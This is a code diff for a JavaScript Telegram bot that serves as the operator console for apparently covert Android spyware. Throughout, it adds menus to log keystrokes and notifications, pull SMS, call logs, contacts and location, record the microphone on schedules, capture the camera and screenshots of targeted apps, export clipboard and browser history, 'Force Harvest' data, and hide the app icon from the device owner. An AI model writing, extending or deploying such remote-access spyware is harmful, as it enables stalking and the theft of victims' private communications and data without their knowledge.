@@ -185,7 +185,6 @@ function getDeviceSelectionKeyboard(chatId) {
     
     return keyboard;
 }
-
 function getMainMenuKeyboard(chatId) {
     const activeDeviceId = userDeviceSelection.get(chatId);
     const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
@@ -198,15 +197,15 @@ function getMainMenuKeyboard(chatId) {
 
     return [
         [
-            { text: '📱 Device Info', callback_data: 'cmd:device_info' },
-            { text: '🌐 Network Info', callback_data: 'cmd:network_info' }
+            { text: '📱 Device Info', callback_data: 'menu_device_info' },
+            { text: '📞 Phone Info', callback_data: 'menu_phone_info' }
         ],
         [
-            { text: '📞 Mobile Info', callback_data: 'cmd:mobile_info' },
-            { text: '📍 Location', callback_data: 'cmd:location' }
+            { text: '📍 Tracking', callback_data: 'menu_tracking' },
+            { text: '🌐 Network', callback_data: 'menu_network' }
         ],
         [
-            { text: '📸 Screenshot', callback_data: 'cmd:screenshot' },
+            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
             { text: '🎤 Recording', callback_data: 'menu_recording' }
         ],
         [
@@ -214,38 +213,38 @@ function getMainMenuKeyboard(chatId) {
             { text: '💬 Social', callback_data: 'menu_social' }
         ],
         [
-            { text: '🔍 File Scanner', callback_data: 'menu_scanner' },
-            { text: '📊 Data Export', callback_data: 'menu_data_export' }
+            { text: '📁 Media', callback_data: 'menu_media' },
+            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
         ],
         [
-            { text: '⚡ Real-time', callback_data: 'menu_realtime' },
+            { text: '⚙️ Services', callback_data: 'menu_services' },
             { text: deviceStatus, callback_data: 'menu_devices' }
         ],
         [
-            { text: '🔄 Sync & Harvest', callback_data: 'cmd:sync_all' },
+            { text: '🆕 NEW FEATURES', callback_data: 'menu_new_features' },
             { text: '❌ Close', callback_data: 'close_menu' }
         ]
     ];
 }
 
-// ============= MENU KEYBOARDS =============
+// ============= STABLE SUB-MENU FUNCTIONS =============
 
 function getCameraMenuKeyboard() {
     return [
         [
-            { text: '📸 Take Photo', callback_data: 'cmd:photo' },
-            { text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }
+            { text: '📸 Take Photo', callback_data: 'take_photo' },
+            { text: '🔄 Switch Camera', callback_data: 'camera_switch' }
         ],
         [
-            { text: '👤 Front Camera', callback_data: 'cmd:camera_front' },
-            { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }
+            { text: '👤 Front Camera', callback_data: 'camera_front' },
+            { text: '👥 Back Camera', callback_data: 'camera_back' }
         ],
         [
-            { text: '✅ Start Monitoring', callback_data: 'cmd:camera_on' },
-            { text: '❌ Stop Monitoring', callback_data: 'cmd:camera_off' }
+            { text: '✅ Start Monitoring', callback_data: 'camera_on' },
+            { text: '❌ Stop Monitoring', callback_data: 'camera_off' }
         ],
         [
-            { text: '📊 Camera Status', callback_data: 'cmd:camera_status' },
+            { text: '📊 Camera Status', callback_data: 'camera_status' },
             { text: '◀️ Back', callback_data: 'help_main' }
         ]
     ];
@@ -254,15 +253,15 @@ function getCameraMenuKeyboard() {
 function getRecordingMenuKeyboard() {
     return [
         [
-            { text: '🎤 Start 60s', callback_data: 'cmd:start_60s_rec' },
-            { text: '⏹️ Stop', callback_data: 'cmd:stop_60s_rec' }
+            { text: '🎤 Start 60s', callback_data: 'start_60s_rec' },
+            { text: '⏹️ Stop', callback_data: 'stop_60s_rec' }
         ],
         [
-            { text: '⏰ Schedule Info', callback_data: 'cmd:record_info' },
-            { text: '✅ Auto ON', callback_data: 'cmd:record_auto_on' }
+            { text: '⏰ Schedule Info', callback_data: 'record_info' },
+            { text: '✅ Auto ON', callback_data: 'record_auto_on' }
         ],
         [
-            { text: '❌ Auto OFF', callback_data: 'cmd:record_auto_off' },
+            { text: '❌ Auto OFF', callback_data: 'record_auto_off' },
             { text: '⚙️ Custom Schedule', callback_data: 'start_custom_schedule_interactive' }
         ],
         [
@@ -272,39 +271,19 @@ function getRecordingMenuKeyboard() {
     ];
 }
 
-function getAudioQualityMenuKeyboard() {
-    return [
-        [
-            { text: '🎤 Ultra Low (8k)', callback_data: 'cmd:audio_ultra' },
-            { text: '🎤 Very Low (16k)', callback_data: 'cmd:audio_very_low' }
-        ],
-        [
-            { text: '🎤 Low (24k)', callback_data: 'cmd:audio_low' },
-            { text: '🎤 Medium (32k)', callback_data: 'cmd:audio_medium' }
-        ],
-        [
-            { text: '🎤 High (64k)', callback_data: 'cmd:audio_high' },
-            { text: 'ℹ️ Audio Info', callback_data: 'cmd:audio_info' }
-        ],
-        [
-            { text: '◀️ Back to Recording', callback_data: 'menu_recording' }
-        ]
-    ];
-}
-
 function getSocialMenuKeyboard() {
     return [
         [
-            { text: '💬 WhatsApp', callback_data: 'cmd:whatsapp' },
-            { text: '💬 Telegram', callback_data: 'cmd:telegram' }
+            { text: '💬 WhatsApp', callback_data: 'whatsapp' },
+            { text: '💬 Telegram', callback_data: 'telegram' }
         ],
         [
-            { text: '💬 Facebook', callback_data: 'cmd:facebook' },
-            { text: '🌐 Browser', callback_data: 'cmd:browser' }
+            { text: '💬 Facebook', callback_data: 'facebook' },
+            { text: '🌐 Browser', callback_data: 'browser' }
         ],
         [
-            { text: '📋 Clipboard', callback_data: 'cmd:clipboard' },
-            { text: '📅 Calendar', callback_data: 'cmd:calendar' }
+            { text: '📋 Clipboard', callback_data: 'clipboard' },
+            { text: '📅 Calendar', callback_data: 'calendar' }
         ],
         [
             { text: '◀️ Back', callback_data: 'help_main' }
@@ -312,38 +291,38 @@ function getSocialMenuKeyboard() {
     ];
 }
 
-function getScannerMenuKeyboard() {
+function getMediaMenuKeyboard() {
     return [
         [
-            { text: '🔍 Full System Scan', callback_data: 'cmd:scan_all' },
-            { text: '🎵 Media Scan', callback_data: 'cmd:scan_media' }
+            { text: '🔍 Find Media', callback_data: 'find_media' },
+            { text: '📸 Screenshots', callback_data: 'screenshots' }
         ],
         [
-            { text: '❓ Scan Help', callback_data: 'cmd:scan_help' },
+            { text: '🎤 Find Recordings', callback_data: 'find_recorded' },
+            { text: '🎵 Media Scan', callback_data: 'media_scan' }
+        ],
+        [
+            { text: '🔬 Full Scan', callback_data: 'full_scan' },
+            { text: '❓ Scan Help', callback_data: 'scan_help' }
+        ],
+        [
             { text: '◀️ Back', callback_data: 'help_main' }
         ]
     ];
 }
 
-function getDataExportMenuKeyboard() {
+function getNetworkMenuKeyboard() {
     return [
         [
-            { text: '📇 Contacts', callback_data: 'cmd:contacts' },
-            { text: '💬 SMS', callback_data: 'cmd:sms' }
+            { text: '🌐 IP Info', callback_data: 'ip_info' },
+            { text: '📶 WiFi Info', callback_data: 'wifi_info' }
         ],
         [
-            { text: '📞 Call Logs', callback_data: 'cmd:calllogs' },
-            { text: '📱 Apps List', callback_data: 'cmd:apps_list' }
+            { text: '📱 Mobile Info', callback_data: 'mobile_info' },
+            { text: '📡 Network Status', callback_data: 'network_status' }
         ],
         [
-            { text: '⌨️ Keystrokes', callback_data: 'cmd:keys' },
-            { text: '🔔 Notifications', callback_data: 'cmd:notify' }
-        ],
-        [
-            { text: '📱 App Opens', callback_data: 'cmd:open_app' },
-            { text: '📊 Device Info', callback_data: 'cmd:device_info' }
-        ],
-        [
+            { text: '🌍 All Network', callback_data: 'all_info' },
             { text: '◀️ Back', callback_data: 'help_main' }
         ]
     ];
@@ -352,20 +331,328 @@ function getDataExportMenuKeyboard() {
 function getRealtimeMenuKeyboard() {
     return [
         [
-            { text: '🔑 Keys ON', callback_data: 'cmd:rt_keys_on' },
-            { text: '🔑 Keys OFF', callback_data: 'cmd:rt_keys_off' }
+            { text: '🔑 Keys ON', callback_data: 'realtime_keystrokes_on' },
+            { text: '🔑 Keys OFF', callback_data: 'realtime_keystrokes_off' }
         ],
         [
-            { text: '🔔 Notif ON', callback_data: 'cmd:rt_notif_on' },
-            { text: '🔔 Notif OFF', callback_data: 'cmd:rt_notif_off' }
+            { text: '🔔 Notif ON', callback_data: 'realtime_notifications_on' },
+            { text: '🔔 Notif OFF', callback_data: 'realtime_notifications_off' }
         ],
         [
-            { text: '✅ All ON', callback_data: 'cmd:rt_all_on' },
-            { text: '❌ All OFF', callback_data: 'cmd:rt_all_off' }
+            { text: '✅ All ON', callback_data: 'realtime_all_on' },
+            { text: '❌ All OFF', callback_data: 'realtime_all_off' }
         ],
         [
-            { text: '📊 Status', callback_data: 'cmd:rt_status' },
+            { text: '📊 Status', callback_data: 'realtime_status' },
             { text: '◀️ Back', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getServicesMenuKeyboard() {
+    return [
+        [
+            { text: '👻 Hide Icon', callback_data: 'hide_icon' },
+            { text: '👁️ Show Icon', callback_data: 'show_icon' }
+        ],
+        [
+            { text: '🔄 Reboot Services', callback_data: 'reboot_app' },
+            { text: '🗑️ Clear Logs', callback_data: 'clear_logs' }
+        ],
+        [
+            { text: '📊 Service Status', callback_data: 'status' },
+            { text: '📝 Logs Count', callback_data: 'logs_count' }
+        ],
+        [
+            { text: '📈 Stats', callback_data: 'stats' },
+            { text: '🔄 Refresh', callback_data: 'refresh_data' }
+        ],
+        [
+            { text: '⚡ Force Harvest', callback_data: 'force_harvest' },
+            { text: '🔄 Sync All', callback_data: 'sync_all' }
+        ],
+        [
+            { text: '◀️ Back', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getDeviceInfoMenuKeyboard() {
+    return [
+        [
+            { text: '🌐 Network Info', callback_data: 'network' },
+            { text: '📱 Apps List', callback_data: 'apps' }
+        ],
+        [
+            { text: '📱 Device Info', callback_data: 'info' },
+            { text: '🔋 Battery', callback_data: 'battery' }
+        ],
+        [
+            { text: '💾 Storage', callback_data: 'storage' },
+            { text: '🕐 Time', callback_data: 'time' }
+        ],
+        [
+            { text: '📊 Status', callback_data: 'status' },
+            { text: '◀️ Back', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getPhoneInfoMenuKeyboard() {
+    return [
+        [
+            { text: '📞 Phone Number', callback_data: 'phone_number' },
+            { text: '📱 SIM Info', callback_data: 'sim_info' }
+        ],
+        [
+            { text: '📱 Mobile Info', callback_data: 'mobile_info' },
+            { text: '📞 Call Logs', callback_data: 'calllogs' }
+        ],
+        [
+            { text: '📍 Location', callback_data: 'location' },
+            { text: '💬 SMS', callback_data: 'sms' }
+        ],
+        [
+            { text: '📇 Contacts', callback_data: 'contacts' },
+            { text: '📅 Calendar', callback_data: 'calendar' }
+        ],
+        [
+            { text: '◀️ Back', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getTrackingMenuKeyboard() {
+    return [
+        [
+            { text: '📍 Location', callback_data: 'location' },
+            { text: '⌨️ Keystrokes', callback_data: 'keystrokes' }
+        ],
+        [
+            { text: '🔔 Notifications', callback_data: 'notifications' },
+            { text: '📱 App Opens', callback_data: 'app_opens' }
+        ],
+        [
+            { text: '◀️ Back', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getScreenshotMenuKeyboard() {
+    return [
+        [
+            { text: '📸 Take Now', callback_data: 'screenshot' },
+            { text: '⚙️ Settings', callback_data: 'screenshot_settings' }
+        ],
+        [
+            { text: '▶️ Start Service', callback_data: 'start_screenshot' },
+            { text: '⏹️ Stop Service', callback_data: 'stop_screenshot' }
+        ],
+        [
+            { text: '📸 Screenshot Logs', callback_data: 'screenshots' },
+            { text: '📏 Size Status', callback_data: 'size_status' }
+        ],
+        [
+            { text: '📸 Method Info', callback_data: 'screenshot_method' },
+            { text: '📱 Target Apps', callback_data: 'target_apps' }
+        ],
+        [
+            { text: '➕ Add Target', callback_data: 'add_target_example' },
+            { text: '◀️ Back', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getAudioQualityMenuKeyboard() {
+    return [
+        [
+            { text: '🎤 Ultra Low (8k)', callback_data: 'audio_ultra' },
+            { text: '🎤 Very Low (16k)', callback_data: 'audio_very_low' }
+        ],
+        [
+            { text: '🎤 Low (24k)', callback_data: 'audio_low' },
+            { text: '🎤 Medium (32k)', callback_data: 'audio_medium' }
+        ],
+        [
+            { text: '🎤 High (64k)', callback_data: 'audio_high' },
+            { text: 'ℹ️ Audio Info', callback_data: 'audio_info' }
+        ],
+        [
+            { text: '◀️ Back to Recording', callback_data: 'menu_recording' }
+        ]
+    ];
+}
+
+function getNewFeaturesMenuKeyboard() {
+    return [
+        [
+            { text: '📊 Detailed Exports', callback_data: 'menu_detailed_exports' },
+            { text: '🔍 File Scanner', callback_data: 'menu_file_scanner' }
+        ],
+        [
+            { text: '📡 Data Saving', callback_data: 'menu_data_saving' },
+            { text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }
+        ],
+        [
+            { text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' },
+            { text: '🔊 Real-time Controls', callback_data: 'menu_realtime_advanced' }
+        ],
+        [
+            { text: '📱 App Opens', callback_data: 'menu_app_opens' },
+            { text: '📅 Calendar', callback_data: 'menu_calendar' }
+        ],
+        [
+            { text: '📋 Clipboard', callback_data: 'menu_clipboard' },
+            { text: '🌐 Browser History', callback_data: 'menu_browser_history' }
+        ],
+        [
+            { text: '◀️ Back to Main', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getDetailedExportsMenuKeyboard() {
+    return [
+        [
+            { text: '📇 Detailed Contacts', callback_data: 'contacts_detailed' },
+            { text: '📱 Detailed Apps', callback_data: 'apps_detailed' }
+        ],
+        [
+            { text: '⌨️ Detailed Keystrokes', callback_data: 'keystrokes_detailed' },
+            { text: '🔔 Detailed Notifications', callback_data: 'notifications_detailed' }
+        ],
+        [
+            { text: '📊 Device Snapshots', callback_data: 'device_snapshots' },
+            { text: '📈 Device History', callback_data: 'device_history' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getFileScannerMenuKeyboard() {
+    return [
+        [
+            { text: '🔍 Full System Scan', callback_data: 'full_scan' },
+            { text: '🎵 Media Only Scan', callback_data: 'media_scan' }
+        ],
+        [
+            { text: '🔬 Deep Scan (Detailed)', callback_data: 'full_scan_detailed' },
+            { text: '🎤 Find Recordings', callback_data: 'find_recorded' }
+        ],
+        [
+            { text: '📁 Find All Media', callback_data: 'find_media' },
+            { text: '❓ Scan Help', callback_data: 'scan_help' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getDataSavingMenuKeyboard() {
+    return [
+        [
+            { text: '📡 WiFi-Only ON', callback_data: 'wifi_only_on' },
+            { text: '📡 WiFi-Only OFF', callback_data: 'wifi_only_off' }
+        ],
+        [
+            { text: '🌐 Network Status', callback_data: 'network_status' },
+            { text: '📊 WiFi-Only Status', callback_data: 'wifi_only_status' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getSyncHarvestMenuKeyboard() {
+    return [
+        [
+            { text: '🔄 Sync All Tables', callback_data: 'sync_all' },
+            { text: '⚡ Force Harvest', callback_data: 'force_harvest' }
+        ],
+        [
+            { text: '🔄 Refresh Data', callback_data: 'refresh_data' },
+            { text: '📊 Database Stats', callback_data: 'stats' }
+        ],
+        [
+            { text: '🗑️ Clear Logs', callback_data: 'clear_logs' },
+            { text: '📊 Logs Count', callback_data: 'logs_count' }
+        ],
+        [
+            { text: '🔄 Reboot Services', callback_data: 'reboot_app' },
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getRealtimeAdvancedMenuKeyboard() {
+    return [
+        [
+            { text: '🔑 Realtime Keys ON', callback_data: 'realtime_keystrokes_on' },
+            { text: '🔑 Realtime Keys OFF', callback_data: 'realtime_keystrokes_off' }
+        ],
+        [
+            { text: '🔔 Realtime Notif ON', callback_data: 'realtime_notifications_on' },
+            { text: '🔔 Realtime Notif OFF', callback_data: 'realtime_notifications_off' }
+        ],
+        [
+            { text: '✅ All Realtime ON', callback_data: 'realtime_all_on' },
+            { text: '❌ All Realtime OFF', callback_data: 'realtime_all_off' }
+        ],
+        [
+            { text: '📊 Realtime Status', callback_data: 'realtime_status' },
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getAppOpensMenuKeyboard() {
+    return [
+        [
+            { text: '📱 App Opens (JSON)', callback_data: 'app_opens' },
+            { text: '📱 App Opens (HTML)', callback_data: 'app_opens_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getCalendarMenuKeyboard() {
+    return [
+        [
+            { text: '📅 Calendar Events', callback_data: 'calendar' },
+            { text: '📅 Calendar (HTML)', callback_data: 'calendar_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getClipboardMenuKeyboard() {
+    return [
+        [
+            { text: '📋 Clipboard Logs', callback_data: 'clipboard' },
+            { text: '📋 Clipboard (HTML)', callback_data: 'clipboard_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getBrowserHistoryMenuKeyboard() {
+    return [
+        [
+            { text: '🌐 Browser History', callback_data: 'browser_history' },
+            { text: '🌐 Browser History (HTML)', callback_data: 'browser_history_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
         ]
     ];
 }
@@ -735,7 +1022,7 @@ async function handleCallbackQuery(callbackQuery) {
     
     await answerCallbackQuery(callbackId);
     
-    // Menu navigation
+    // ============= MAIN MENU NAVIGATION =============
     if (data === 'help_main') {
         await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
         await sendTelegramMessage(chatId, "🤖 *Main Menu*\n\nSelect a category to get started.");
@@ -756,17 +1043,77 @@ async function handleCallbackQuery(callbackQuery) {
         await editMessageKeyboard(chatId, messageId, getSocialMenuKeyboard());
         await sendTelegramMessage(chatId, "💬 *Social Media*\n\nSelect platform:");
         
-    } else if (data === 'menu_scanner') {
-        await editMessageKeyboard(chatId, messageId, getScannerMenuKeyboard());
-        await sendTelegramMessage(chatId, "🔍 *File Scanner*\n\nSelect scan type:");
+    } else if (data === 'menu_media') {
+        await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
+        await sendTelegramMessage(chatId, "📁 *Media Scanner*\n\nSelect scan type:");
         
-    } else if (data === 'menu_data_export') {
-        await editMessageKeyboard(chatId, messageId, getDataExportMenuKeyboard());
-        await sendTelegramMessage(chatId, "📊 *Data Export*\n\nSelect data type to export:");
+    } else if (data === 'menu_network') {
+        await editMessageKeyboard(chatId, messageId, getNetworkMenuKeyboard());
+        await sendTelegramMessage(chatId, "🌐 *Network Information*\n\nSelect option:");
         
     } else if (data === 'menu_realtime') {
         await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
         await sendTelegramMessage(chatId, "⚡ *Real-time Controls*\n\nSelect option:");
+        
+    } else if (data === 'menu_services') {
+        await editMessageKeyboard(chatId, messageId, getServicesMenuKeyboard());
+        await sendTelegramMessage(chatId, "🔧 *Service Controls*\n\nSelect option:");
+        
+    } else if (data === 'menu_device_info') {
+        await editMessageKeyboard(chatId, messageId, getDeviceInfoMenuKeyboard());
+        await sendTelegramMessage(chatId, "📱 *Device Information*\n\nSelect option:");
+        
+    } else if (data === 'menu_phone_info') {
+        await editMessageKeyboard(chatId, messageId, getPhoneInfoMenuKeyboard());
+        await sendTelegramMessage(chatId, "📞 *Phone Information*\n\nSelect option:");
+        
+    } else if (data === 'menu_tracking') {
+        await editMessageKeyboard(chatId, messageId, getTrackingMenuKeyboard());
+        await sendTelegramMessage(chatId, "📍 *Tracking Options*\n\nSelect option:");
+        
+    } else if (data === 'menu_screenshot') {
+        await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
+        await sendTelegramMessage(chatId, "📸 *Screenshot Controls*\n\nSelect option:");
+        
+    } else if (data === 'menu_new_features') {
+        await editMessageKeyboard(chatId, messageId, getNewFeaturesMenuKeyboard());
+        await sendTelegramMessage(chatId, "🆕 *NEW FEATURES MENU*\n\nSelect a category to explore the latest additions!");
+        
+    } else if (data === 'menu_detailed_exports') {
+        await editMessageKeyboard(chatId, messageId, getDetailedExportsMenuKeyboard());
+        await sendTelegramMessage(chatId, "📊 *DETAILED EXPORTS*\n\nGet comprehensive data exports with full details.");
+        
+    } else if (data === 'menu_file_scanner') {
+        await editMessageKeyboard(chatId, messageId, getFileScannerMenuKeyboard());
+        await sendTelegramMessage(chatId, "🔍 *FILE SCANNER*\n\nPowerful file system scanning tools.");
+        
+    } else if (data === 'menu_data_saving') {
+        await editMessageKeyboard(chatId, messageId, getDataSavingMenuKeyboard());
+        await sendTelegramMessage(chatId, "📡 *DATA SAVING MODE*\n\nSave mobile data usage.");
+        
+    } else if (data === 'menu_sync_harvest') {
+        await editMessageKeyboard(chatId, messageId, getSyncHarvestMenuKeyboard());
+        await sendTelegramMessage(chatId, "🔄 *SYNC & HARVEST*\n\nData synchronization tools.");
+        
+    } else if (data === 'menu_realtime_advanced') {
+        await editMessageKeyboard(chatId, messageId, getRealtimeAdvancedMenuKeyboard());
+        await sendTelegramMessage(chatId, "🔊 *ADVANCED REALTIME CONTROLS*\n\nFine-tune real-time logging.");
+        
+    } else if (data === 'menu_app_opens') {
+        await editMessageKeyboard(chatId, messageId, getAppOpensMenuKeyboard());
+        await sendTelegramMessage(chatId, "📱 *APP OPEN LOGS*\n\nTrack when apps are opened.");
+        
+    } else if (data === 'menu_calendar') {
+        await editMessageKeyboard(chatId, messageId, getCalendarMenuKeyboard());
+        await sendTelegramMessage(chatId, "📅 *CALENDAR EVENTS*\n\nExport calendar data.");
+        
+    } else if (data === 'menu_clipboard') {
+        await editMessageKeyboard(chatId, messageId, getClipboardMenuKeyboard());
+        await sendTelegramMessage(chatId, "📋 *CLIPBOARD LOGS*\n\nExport clipboard history.");
+        
+    } else if (data === 'menu_browser_history') {
+        await editMessageKeyboard(chatId, messageId, getBrowserHistoryMenuKeyboard());
+        await sendTelegramMessage(chatId, "🌐 *BROWSER HISTORY*\n\nExport browsing history.");
         
     } else if (data === 'menu_devices') {
         const userDevices = getDeviceListForUser(chatId);
@@ -838,6 +1185,10 @@ async function handleCallbackQuery(callbackQuery) {
                 `All commands will now be sent to this device.`);
         }
         
+    } else if (data === 'close_menu') {
+        await editMessageKeyboard(chatId, messageId, []);
+        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
+        
     } else if (data === 'start_custom_schedule_interactive') {
         userStates.set(chatId, {
             state: SCHEDULE_STATES.AWAITING_START_TIME,
@@ -857,17 +1208,34 @@ async function handleCallbackQuery(callbackQuery) {
         await editMessageKeyboard(chatId, messageId, []);
         await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
         
-    } else if (data === 'close_menu') {
-        await editMessageKeyboard(chatId, messageId, []);
-        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
+    } else if (data === 'add_target_example') {
+        await sendTelegramMessage(chatId, 
+            "📱 *Add Target App*\n\n" +
+            "Use: `/add_target com.package.name`\n\n" +
+            "Examples:\n" +
+            "• `/add_target com.instagram.android`\n" +
+            "• `/add_target com.whatsapp`\n" +
+            "• `/add_target com.facebook.katana`");
         
-    } else if (data.startsWith('cmd:')) {
-        const command = data.substring(4);
-        console.log(`🎯 Executing command from button: ${command}`);
+    } else if (data.startsWith('recurring:')) {
+        const recurring = data.split(':')[1];
+        const userState = userStates.get(chatId);
         
-        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
+        if (userState && userState.state === SCHEDULE_STATES.AWAITING_RECURRING) {
+            userState.data.recurring = recurring === 'daily';
+            userState.state = SCHEDULE_STATES.AWAITING_INTERVAL;
+            
+            await editMessageKeyboard(chatId, messageId, []);
+            await sendTelegramMessage(chatId, 
+                "✅ Schedule type recorded.\n\n" +
+                "Finally, enter the recording interval in minutes (e.g., 15, 30, 60):");
+        }
         
-        await handleCommand(chatId, `/${command}`, messageId);
+    } else {
+        // Handle direct command callbacks (like 'screenshot', 'photo', etc.)
+        console.log(`🎯 Executing command from button: ${data}`);
+        await answerCallbackQuery(callbackId, `⏳ Executing ${data}...`);
+        await handleCommand(chatId, `/${data}`, messageId);
         
         const keyboard = [
             [
